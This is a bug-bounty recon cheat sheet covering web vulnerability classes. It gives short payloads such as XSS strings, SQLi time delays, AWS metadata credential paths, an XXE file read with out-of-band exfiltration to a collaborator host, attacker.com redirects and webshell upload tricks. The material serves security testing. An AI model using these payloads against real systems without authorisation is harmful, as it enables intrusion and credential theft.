# Bug Recon Methodology

---

## XSS (Cross-Site Scripting)

- Input ends up reflected in a DOM element like `<p>`, `<img>`, `<div>`, or inside a JS variable.
- Change input type from `email`/`number` to `text` to bypass client-side validation. Try payload: `foo@x.com"><img src=x onerror=alert(1)>`.
- Break out of HTML attributes using `">`, out of JS strings using `'`, and out of template literals using `}`.
- Check for DOM sinks: `innerHTML`, `document.write`, `eval`, `location.href`, `setTimeout(str)`.
- Stored XSS: inject into profile fields, comments, usernames — any data rendered back to other users.
- Blind XSS: use an out-of-band payload (e.g. XSS Hunter) in fields that reach admin panels or email templates.
- CSP bypass: look for `unsafe-inline`, `unsafe-eval`, whitelisted JSONP endpoints, or Angular/JSONP gadgets.

---

## SQLi (SQL Injection)

- Test with `'`, `''`, `\`, `--`, `; --` in any parameter that hits a database (search, login, ID).
- Error-based: look for DB error messages leaking table/column names.
- Boolean-based blind: `AND 1=1` (normal) vs `AND 1=2` (breaks) — different response lengths/content.
- Time-based blind: `'; WAITFOR DELAY '0:0:5'--` (MSSQL) or `AND SLEEP(5)--` (MySQL).
- Second-order SQLi: payload stored benignly, executes when retrieved in another context.
- Check ORM-based apps too — raw queries or `LIKE` clauses are often missed.

---

## IDOR (Insecure Direct Object Reference)

- Swap IDs in URLs, body params, and headers: `/api/invoice/1042` → try `1041`, `1043`.
- Look for GUIDs — they're not always random; check if they're sequential or leaked elsewhere.
- Test horizontal privilege escalation (same role, different user) and vertical (user → admin).
- Check indirect references too: filenames in params, email addresses, slugs.
- Replay another user's request with your session cookie.

---

## SSRF (Server-Side Request Forgery)

- Identify params that accept URLs or hostnames: `url=`, `redirect=`, `fetch=`, `img=`, `path=`.
- Test with `http://127.0.0.1`, `http://169.254.169.254` (AWS metadata), `http://localhost:8080`.
- Bypass filters using: `http://2130706433` (decimal IP), `http://127.1`, DNS rebinding, `http://[::1]`.
- Blind SSRF: use Burp Collaborator or interactsh to detect out-of-band HTTP/DNS callbacks.
- SSRF via file uploads: SVG with external `<image href>`, PDF with external links, XML with XXE.
- Cloud targets: try `/latest/meta-data/iam/security-credentials/` for AWS IAM keys.

---

## XXE (XML External Entity)

- Triggered anywhere XML is parsed: file upload, SOAP APIs, SVG, DOCX/XLSX imports.
- Classic read: `<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` then reference `&xxe;`.
- Blind XXE: use out-of-band with `SYSTEM "http://your-collaborator/?data=..."`.
- Error-based: trigger a parse error that leaks file content in the error message.
- Check for `Content-Type: application/xml` — try switching JSON endpoints to XML.

---

## Open Redirect

- Look for `redirect=`, `next=`, `return=`, `url=`, `goto=` parameters.
- Test with `https://attacker.com`, `//attacker.com`, `\/\/attacker.com`, `/%09/attacker.com`.
- URL-encoded and double-encoded bypasses: `%2F%2Fattacker.com`.
- Chained with OAuth: an open redirect on the auth server can leak OAuth tokens via the `redirect_uri`.

---

## CSRF (Cross-Site Request Forgery)

- Target state-changing requests: password change, email change, fund transfer, account deletion.
- Check if CSRF token is present; if not, craft a cross-origin form/fetch and test.
- Token present but not validated? Send a request with a blank or wrong token.
- SameSite cookie check: `SameSite=None` without HTTPS or missing entirely = exploitable.
- JSON-based CSRF: if endpoint accepts `text/plain`, a form with `enctype="text/plain"` can work.

---

## Broken Auth / Session Issues

- Test for predictable tokens: base64-decoded JWTs, sequential session IDs.
- JWT attacks: `alg: none`, HMAC-to-RSA confusion (sign with public key as HMAC secret), weak secret brute-force.
- Check if sessions are invalidated after logout or password change.
- Password reset: test expired/reusable tokens, host header injection in reset emails, leakage in `Referer`.
- Multi-step auth bypass: jump directly to step 3 URL without completing steps 1–2.

---

## File Upload Vulnerabilities

- Upload `.php`, `.phtml`, `.php5`, `.shtml` disguised as images by changing `Content-Type` to `image/jpeg`.
- Double extension: `shell.php.jpg` — some servers execute based on first extension.
- Check if upload destination is web-accessible; place a webshell and browse to it.
- Path traversal in filename: `../../etc/cron.d/shell`.
- SVG upload = stored XSS vector via embedded `<script>` or `<foreignObject>`.
- Large file = DoS if no size limit is enforced.

---

## CORS Misconfiguration

- Check response for `Access-Control-Allow-Origin` reflecting arbitrary `Origin` header.
- Test with `Origin: null` — some configs trust `null` (triggered by sandboxed iframes).
- If `Access-Control-Allow-Credentials: true` + reflected origin = full account takeover via JS.
- Look for wildcard (`*`) on sensitive endpoints — readable by any origin.

---

## Business Logic Flaws

- Negative quantities in cart: set `qty=-1` to subtract from total or gain credit.
- Race conditions: concurrent requests on "use once" coupons, withdrawal limits, or OTP checks.
- Step skipping: skip payment step by directly hitting the order-confirmation endpoint.
- Parameter tampering: change price, role, plan, or status fields in request body.
- Mass assignment: send extra fields (`isAdmin: true`, `role: admin`) in JSON body to registration/update endpoints.

---

## Path Traversal / LFI

- `../../etc/passwd`, `....//....//etc/passwd`, `%2e%2e%2f`, `..%252f..%252f`.
- Common in `file=`, `template=`, `page=`, `lang=`, `include=` parameters.
- LFI to RCE: log poisoning (inject PHP in User-Agent, include `/var/log/apache2/access.log`), `/proc/self/environ`.
- Check for ZIP slip in archive extraction — filenames like `../../webroot/shell.php`.

---

## Subdomain Takeover

- Find CNAMEs pointing to deprovisioned services (Heroku, GitHub Pages, Fastly, AWS S3).
- `dig CNAME target.example.com` → if it resolves to an unclaimed service, register it.
- Tools: `subjack`, `nuclei subdomain-takeover templates`.

---

## HTTP Header Injection / CRLF

- Inject `%0d%0a` (CRLF) into `Location`, `Set-Cookie`, or other reflected headers.
- Can lead to response splitting, cache poisoning, or cookie injection.
- Test in `redirect=`, `url=`, and any param echoed in response headers.

---

## GraphQL

- Introspection enabled in prod: run `__schema` query to dump full API.
- Missing auth on mutations: test `deleteUser`, `updateRole` without auth token.
- Batching attacks: send 1000 login mutations in one request to bypass rate limiting.
- Nested queries for DoS: deeply nested circular queries exhaust server resources.

---

## Rate Limiting / Enumeration

- No rate limit on login → credential stuffing; on OTP → brute-force.
- Username enumeration: different response time/message for valid vs invalid usernames.
- Verify that rate limits aren't only client-side (JS disabled or raw requests bypass).
